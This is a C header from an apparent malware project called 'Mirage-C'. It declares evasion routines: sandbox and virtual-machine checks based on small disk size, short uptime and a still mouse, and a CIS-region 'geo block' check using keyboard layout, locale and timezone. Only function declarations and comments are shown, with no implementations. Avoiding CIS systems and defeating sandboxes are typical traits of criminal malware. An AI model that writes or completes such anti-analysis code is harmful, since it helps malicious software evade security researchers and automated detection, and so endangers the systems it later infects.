/*
 * detection.h — VM/debugger/environment detection for Mirage-C
 *
 * Direct translation of Zig src/evasion/detection.zig.
 * Provides: disk size, uptime, mouse movement, geo block checks.
 */

#ifndef MIRAGE_DETECTION_H
#define MIRAGE_DETECTION_H

#include "nt_types.h"

#ifdef __cplusplus
extern "C" {
#endif

/* ── Geo result ──────────────────────────────────────────── */
typedef struct {
    int cis_keyboard;   /* CIS keyboard layout detected */
    int cis_locale;     /* CIS system locale detected */
    int cis_timezone;   /* CIS timezone (UTC+3 to UTC+12) detected */
    uint32_t matched;   /* Number of CIS indicators matched */
} mirage_geo_result;

/*
 * checkDiskSize — Query C:\ total disk space via GetDiskFreeSpaceExA.
 * Returns 1 if <60 GB (VM indicator), 0 if >=60 GB, -1 on error.
 */
int mirage_check_disk_size(void);

/*
 * checkUptime — Query system uptime via GetTickCount64.
 * Returns 1 if <30 minutes (VM indicator), 0 if >=30 min, -1 on error.
 */
int mirage_check_uptime(void);

/*
 * checkMouseMovement — Compare cursor position before/after 200ms delay.
 * Returns 1 if cursor didn't move (VM indicator), 0 if moved, -1 on error.
 */
int mirage_check_mouse_movement(void);

/*
 * checkGeoBlock — Check keyboard layout, locale, timezone for CIS region.
 * Returns geo result with matched count.
 */
mirage_geo_result mirage_check_geo_block(void);

#ifdef __cplusplus
}
#endif

#endif /* MIRAGE_DETECTION_H */
